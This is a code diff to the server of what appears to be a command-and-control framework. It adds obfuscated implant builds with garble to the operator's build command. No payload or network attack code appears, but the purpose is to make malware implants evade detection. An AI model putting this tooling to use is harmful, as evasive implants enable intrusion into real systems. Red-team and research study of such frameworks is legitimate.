@@ -108,6 +108,38 @@ def build_implant(protocol):
             logger.error("no case match found")
 
 
+def garble_implant(protocol):
+    """
+    Builds an implant using garble
+    :param protocol: The protocol to communicate over
+    :return: bool depending on build success
+    """
+    logger.info("building implant using garble")
+    match protocol:
+        case "http":
+            try:
+                result = subprocess.run(
+                    ["garble", "build", "-tags", "http", "./http"],
+                    cwd='../Implant',
+                    check=True,
+                    capture_output=True,
+                    text=True
+                )
+                logger.info("success building")
+                print(result)
+                return True
+            except subprocess.CalledProcessError as e:
+                logger.error(f"error building: {e}")
+                logger.error(f"stdout: {e.stdout}")
+                logger.error(f"stderr: {e.stderr}")
+                return False
+            except Exception as e:
+                logger.error(f"general exception occurred: {e}")
+                return False
+        case _:
+            logger.error("no case match found")
+
+
 def add_user(new_user_id):
     """
     Adds a new user to the result storage dict
@@ -254,15 +286,25 @@ def handle_client(client_socket):
 
             case "BLD":
                 logger.info("controller building new implant")
-                request_type, uname, token, *message = client_request.split(" ", 3)
+                request_type, uname, token, garbler, *message = client_request.split(" ", 4)
                 logger.info(f"checking session token")
                 if token in operator_session_tokens:
-                    bld_status = build_implant(message[0])
-                    print(bld_status)
-                    if bld_status is True:
-                        client_socket.send("Building implant succeeded!".encode())
+                    if garbler == "y":
+                        bld_status = garble_implant(message[0])
+                        if bld_status is True:
+                            client_socket.send("Garbling implant succeeded!".encode())
+                        else:
+                            client_socket.send("Garbling implant failed...".encode())
+                    if garbler == "n":
+                        bld_status = build_implant(message[0])
+                        if bld_status is True:
+                            client_socket.send("Building implant succeeded!".encode())
+                        else:
+                            client_socket.send("Building implant failed...".encode())
                     else:
-                        client_socket.send("Building implant failed...".encode())
+                        client_socket.send("Not able to build, see log...".encode())
+                        logger.error(f"unknown error occurred when trying to build {request_type} {uname} token"
+                                     f" {garbler} {message[0]}")
                 else:
                     client_socket.send(f"Bad token\n".encode())
                     logger.error("bad token")
